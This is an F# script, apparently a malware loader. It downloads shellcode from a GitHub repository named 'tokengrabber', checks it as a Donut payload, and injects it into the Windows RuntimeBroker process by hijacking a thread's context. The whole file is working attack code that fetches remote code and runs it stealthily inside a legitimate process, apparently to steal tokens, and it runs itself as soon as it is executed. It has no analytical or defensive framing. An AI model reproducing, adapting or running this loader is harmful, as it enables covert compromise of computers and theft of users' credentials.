#nowarn "44"
#r "System.dll"
#r "System.Net.Http.dll"
open System
open System.IO
open System.Diagnostics
open System.Net
open System.Net.Http
open System.Security.Cryptography
open System.Runtime.InteropServices
open System.Text.RegularExpressions
open System.Threading

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint OpenProcess(uint32 dwDesiredAccess, bool bInheritHandle, uint32 dwProcessId)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint OpenThread(uint32 dwDesiredAccess, bool bInheritHandle, uint32 dwThreadId)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern uint32 SuspendThread(nativeint hThread)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern uint32 ResumeThread(nativeint hThread)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool GetThreadContext(nativeint hThread, nativeint lpContext)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool SetThreadContext(nativeint hThread, nativeint lpContext)

[<DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)>]
extern nativeint GetModuleHandleW(string lpModuleName)

[<DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)>]
extern nativeint GetProcAddress(nativeint hModule, string lpProcName)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint VirtualAllocEx(
    nativeint hProcess,
    nativeint lpAddress,
    int dwSize,
    uint32 flAllocationType,
    uint32 flProtect
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool VirtualProtectEx(
    nativeint hProcess,
    nativeint lpAddress,
    int dwSize,
    uint32 flNewProtect,
    [<Out>] uint32& lpflOldProtect
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool WriteProcessMemory(
    nativeint hProcess,
    nativeint lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    [<Out>] nativeint& lpNumberOfBytesWritten
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool CloseHandle(nativeint hObject)

let PROCESS_VM_OPERATION       = 0x0008u
let PROCESS_VM_READ            = 0x0010u
let PROCESS_VM_WRITE           = 0x0020u
let PROCESS_QUERY_INFORMATION  = 0x0400u
let PROCESS_QUERY_LIMITED_INFO = 0x1000u
let PROCESS_ACCESS =
    PROCESS_VM_OPERATION ||| PROCESS_VM_READ ||| PROCESS_VM_WRITE |||
    PROCESS_QUERY_INFORMATION ||| PROCESS_QUERY_LIMITED_INFO

let THREAD_SET_CONTEXT       = 0x0010u
let THREAD_GET_CONTEXT       = 0x0008u
let THREAD_SUSPEND_RESUME    = 0x0002u
let THREAD_QUERY_INFORMATION = 0x0040u
let THREAD_ACCESS =
    THREAD_SET_CONTEXT ||| THREAD_GET_CONTEXT |||
    THREAD_SUSPEND_RESUME ||| THREAD_QUERY_INFORMATION

let MEM_COMMIT        = 0x1000u
let MEM_RESERVE       = 0x2000u
let PAGE_READWRITE    = 0x04u
let PAGE_EXECUTE_READ = 0x20u

let CONTEXT_AMD64 = 0x00100000
let CONTEXT_FLAGS = CONTEXT_AMD64 ||| 0x1B
let CONTEXT_SIZE  = 0x4D0
let CTX_FLAGS_OFF = 0x30
let CTX_RBX = 0x90
let CTX_RSP = 0x98
let CTX_RBP = 0xA0
let CTX_RIP = 0xF8

let shellcodeUrl =
    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/5b527e633e02c7725d601f50be6f0a7a2bbca54b"

let expectedSha256 = "07CE21DEE296744D189975765E23C720B046268C0F4D2032528C156F21AA92B5"
let targetProcessName = "RuntimeBroker"

let runtimeBrokerCandidates () =
    Process.GetProcessesByName targetProcessName |> Array.toList

let preferredTargetPid () =
    match runtimeBrokerCandidates () with
    | p :: _ -> p.Id
    | [] ->
        let brokerPath =
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "RuntimeBroker.exe")
        let startInfo = ProcessStartInfo(brokerPath)
        startInfo.UseShellExecute <- false
        startInfo.CreateNoWindow <- true
        use started = Process.Start(startInfo)
        Thread.Sleep 2000
        match runtimeBrokerCandidates () with
        | p :: _ -> p.Id
        | [] -> failwith "RuntimeBroker indisponivel."

let sha256Hex (bytes: byte[]) =
    use sha = SHA256.Create()
    BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "")

let stubPopOffset (data: byte[]) =
    5 + BitConverter.ToInt32(data, 1)

let stubRetOffset (data: byte[]) =
    stubPopOffset data + 22

let loadShellcode () =
    ServicePointManager.SecurityProtocol <- SecurityProtocolType.Tls12
    use client = new HttpClient()
    client.DefaultRequestHeaders.Add("User-Agent", "opencode-loader")
    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github+json")
    use resp = client.GetAsync(shellcodeUrl, HttpCompletionOption.ResponseHeadersRead).GetAwaiter().GetResult()
    resp.EnsureSuccessStatusCode() |> ignore
    let body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
    let matchContent = Regex.Match(body, "\"content\"\\s*:\\s*\"([^\"]+)\"")
    if not matchContent.Success then
        failwith "Blob do GitHub invalido."

    let raw = matchContent.Groups.[1].Value
    let b64 =
        raw.Replace("\\n", "")
           .Replace("\\r", "")
           .Replace("\\t", "")
           .Replace("\\/", "/")
           .Replace(" ", "")
    let data = Convert.FromBase64String(b64)
    let hash = sha256Hex data

    if hash <> expectedSha256 then
        failwith "Hash do shellcode inesperado."

    if data.Length < 0x300 then
        failwith "Shellcode suspeitamente curto."

    if data.[0] <> 0xE8uy then
        failwith "Stub Donut invalido."

    let popOff = stubPopOffset data
    if popOff >= data.Length || data.[popOff] <> 0x59uy then
        failwith "Stub Donut invalido."

    let retOff = stubRetOffset data
    if retOff + 1 > data.Length || data.[retOff] <> 0xC3uy then
        failwith "Stub Donut truncado."

    data

let injectShellcode (pid: int) (shellcode: byte[]) =
    let proc = Process.GetProcessById pid

    let all = proc.Threads |> Seq.cast<ProcessThread> |> Seq.toList
    if all.IsEmpty then failwith "Processo alvo sem threads."
    let chosen =
        match all |> List.tryFind (fun t -> t.ThreadState = ThreadState.Wait) with
        | Some t -> t
        | None -> all.Head
    let tid = chosen.Id

    let hProc = OpenProcess(PROCESS_ACCESS, false, uint32 pid)
    if hProc = 0n then
        failwithf "OpenProcess(%d) falhou. Win32=%d" pid (Marshal.GetLastWin32Error())

    let mutable hThread = 0n
    let mutable pContext = 0n
    let mutable remoteCode = 0n
    let mutable remoteCtx = 0n
    let mutable remoteTramp = 0n
    let mutable suspended = false

    try
        hThread <- OpenThread(THREAD_ACCESS, false, uint32 tid)
        if hThread = 0n then
            failwithf "OpenThread(%d) falhou. Win32=%d" tid (Marshal.GetLastWin32Error())

        if SuspendThread hThread = UInt32.MaxValue then
            failwithf "SuspendThread falhou. Win32=%d" (Marshal.GetLastWin32Error())
        suspended <- true

        pContext <- Marshal.AllocHGlobal CONTEXT_SIZE
        let zeroes = Array.zeroCreate<byte> CONTEXT_SIZE
        Marshal.Copy(zeroes, 0, pContext, CONTEXT_SIZE)
        Marshal.WriteInt32(pContext, CTX_FLAGS_OFF, CONTEXT_FLAGS)

        if not (GetThreadContext(hThread, pContext)) then
            failwithf "GetThreadContext falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let originalRip = Marshal.ReadInt64(pContext, CTX_RIP)
        let originalRsp = Marshal.ReadInt64(pContext, CTX_RSP)

        let hNtdll = GetModuleHandleW "ntdll.dll"
        if hNtdll = 0n then
            failwithf "GetModuleHandleW(ntdll.dll) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        let pNtContinue = GetProcAddress(hNtdll, "NtContinue")
        if pNtContinue = 0n then
            failwithf "GetProcAddress(NtContinue) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let allocSize = (shellcode.Length + 0xFFF) &&& ~~~0xFFF
        remoteCode <-
            VirtualAllocEx(hProc, 0n, allocSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteCode = 0n then
            failwithf "VirtualAllocEx(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        remoteCtx <-
            VirtualAllocEx(hProc, 0n, CONTEXT_SIZE, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteCtx = 0n then
            failwithf "VirtualAllocEx(CONTEXT) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let trampSize = 0x40
        remoteTramp <-
            VirtualAllocEx(hProc, 0n, trampSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteTramp = 0n then
            failwithf "VirtualAllocEx(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let mutable written = 0n

        let ctxBytes = Array.zeroCreate<byte> CONTEXT_SIZE
        Marshal.Copy(pContext, ctxBytes, 0, CONTEXT_SIZE)
        if not (WriteProcessMemory(hProc, remoteCtx, ctxBytes, CONTEXT_SIZE, &written)) then
            failwithf "WriteProcessMemory(CONTEXT) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let stub = ResizeArray<byte>()
        let emit8 (v: byte) = stub.Add v
        let emit64 (v: int64) =
            for i in 0 .. 7 do
                emit8 (byte ((v >>> (8 * i)) &&& 0xFFL))
        emit8 0x48uy; emit8 0xB9uy; emit64 (remoteCtx.ToInt64())
        emit8 0x48uy; emit8 0x31uy; emit8 0xD2uy
        emit8 0x48uy; emit8 0xB8uy; emit64 (pNtContinue.ToInt64())
        emit8 0xFFuy; emit8 0xD0uy
        emit8 0xCCuy
        let trampBytes = stub.ToArray()
        if not (WriteProcessMemory(hProc, remoteTramp, trampBytes, trampBytes.Length, &written)) then
            failwithf "WriteProcessMemory(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let retOff = stubRetOffset shellcode
        if shellcode.[retOff] <> 0xC3uy then
            failwithf "Stub inesperado em +%d: 0x%X" retOff shellcode.[retOff]

        if not (WriteProcessMemory(hProc, remoteCode, shellcode, shellcode.Length, &written)) then
            failwithf "WriteProcessMemory(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let mutable oldProtect = 0u
        if not (VirtualProtectEx(hProc, remoteCode, allocSize, PAGE_EXECUTE_READ, &oldProtect)) then
            failwithf "VirtualProtectEx(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        oldProtect <- 0u
        if not (VirtualProtectEx(hProc, remoteTramp, trampSize, PAGE_EXECUTE_READ, &oldProtect)) then
            failwithf "VirtualProtectEx(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let callRsp = originalRsp - 8L
        let frame = BitConverter.GetBytes (remoteTramp.ToInt64())
        if not (WriteProcessMemory(hProc, nativeint callRsp, frame, frame.Length, &written)) then
            failwithf "WriteProcessMemory(frame) falhou. Win32=%d" (Marshal.GetLastWin32Error())

        Marshal.WriteInt64(pContext, CTX_RIP, remoteCode.ToInt64())
        Marshal.WriteInt64(pContext, CTX_RSP, callRsp)

        if not (SetThreadContext(hThread, pContext)) then
            failwithf "SetThreadContext falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let pVerify = Marshal.AllocHGlobal CONTEXT_SIZE
        try
            Marshal.Copy(zeroes, 0, pVerify, CONTEXT_SIZE)
            Marshal.WriteInt32(pVerify, CTX_FLAGS_OFF, CONTEXT_FLAGS)
            if not (GetThreadContext(hThread, pVerify)) then
                failwithf "GetThreadContext(pos-Set) falhou. Win32=%d" (Marshal.GetLastWin32Error())
            let ripNow = Marshal.ReadInt64(pVerify, CTX_RIP)
            if ripNow <> remoteCode.ToInt64() then
                failwith "Falha ao redirecionar a thread."
        finally
            Marshal.FreeHGlobal pVerify

        if ResumeThread hThread = UInt32.MaxValue then
            failwithf "ResumeThread falhou. Win32=%d" (Marshal.GetLastWin32Error())
        suspended <- false

    finally
        if suspended && hThread <> 0n then ResumeThread hThread |> ignore
        if pContext <> 0n then Marshal.FreeHGlobal pContext
        if hThread <> 0n then CloseHandle hThread |> ignore
        if hProc <> 0n then CloseHandle hProc |> ignore


let targetPid = preferredTargetPid ()
let shellcode = loadShellcode ()
injectShellcode targetPid shellcode
